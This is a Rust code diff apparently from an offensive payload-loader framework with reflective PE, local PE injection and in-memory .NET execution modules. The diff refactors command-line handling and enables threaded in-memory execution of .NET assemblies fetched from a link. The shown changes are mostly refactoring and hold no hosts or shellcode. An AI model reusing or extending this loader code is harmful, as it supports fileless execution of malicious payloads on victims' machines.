@@ -4,6 +4,7 @@ use crate::payload_util::calculate_path;
 use crate::payload_util::create_diretory;
 use crate::payload_util::same_hash_sha512;
 use crate::rundata::RunData;
+use crate::payload_util::CommandLine;
 
 #[cfg(target_os = "linux")]
 use crate::payload_util::fail_linux_message;
@@ -400,6 +401,7 @@ impl Exec {
         #[cfg(target_os = "linux")]
         set_permission(&path);
 
+        // TODO refacto with payload_utils.commandline
         for i in self.cmdline.trim().split_whitespace() {
             comm.arg(i);
         }
@@ -486,35 +488,6 @@ impl ReflectivePEFromMemory {
 #[cfg(target_os = "windows")]
 use crate::local_pe_injection::main::local_pe_injection;
 //#[cfg(target_os = "windows")]
-use std::env;
-
-
-#[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
-pub enum CommandLine {
-    ArgParse(),
-    Txt(String),
-}
-
-impl CommandLine {
-    pub fn get_buffer(&self) -> Vec<String> {
-        match self.clone() {
-            CommandLine::ArgParse() => env::args().collect(),
-            CommandLine::Txt(commandline) => 
-                commandline.split_whitespace()
-                .map(|mot| mot.to_string())
-                .collect()
-        }
-    }
-    pub fn get_string(&self) -> String {
-        match self.clone() {
-            CommandLine::ArgParse() => {
-                let args: Vec<String> = env::args().collect();
-                args.join(" ")
-            }
-            CommandLine::Txt(commandline) => commandline,
-        }
-    }
-}
 
 
 
@@ -541,13 +514,7 @@ impl LocalPeInjection {
         &self,
         config: &Config,
     ) -> Result<PayloadExecThread, anyhow::Error> {
-        let args_ok: String = match self.commandline.clone() {
-            CommandLine::ArgParse() => {
-                let args: Vec<String> = env::args().collect();
-                args.join(" ")
-            }
-            CommandLine::Txt(commandline) => commandline,
-        };
+        let args_ok: String = self.commandline.get_string();
         let data: Vec<u8> = self.link.fetch_data(config)?;
 
         if self.thread {
@@ -598,24 +565,27 @@ impl DotnetFromMemory {
         let args_ok = self.commandline.get_buffer();
         let data: Vec<u8> = self.link.fetch_data(config)?;
 
-        /*if self.thread {
+        if self.thread {
             let args_ok_commandline = args_ok.clone();
+            let visible = self.visible.clone();
             let thread = thread::spawn(move || {
-                let mut clr = Clr::new(data, thread)?;
-                let _: String = clr.run()?;
-    
+                let mut clr = Clr::new(data, args_ok_commandline).unwrap();
+                let result: String = clr.run().unwrap();
+                if visible {
+                    println!("{}",result);
+                };
             });
             return Ok(PayloadExecThread::Thread(
                 thread,
-                Payload::LocalPeInjection(self.clone()),
+                Payload::DotnetFromMemory(self.clone()),
             ));
-        } else {*/
+        } else {
             let mut clr = Clr::new(data, args_ok).unwrap();
             let result: String = clr.run().unwrap();
             if self.visible {
                 println!("{}",result);
             };
             return Ok(PayloadExecThread::NoThread());
-        //}
+        }
     }
 }
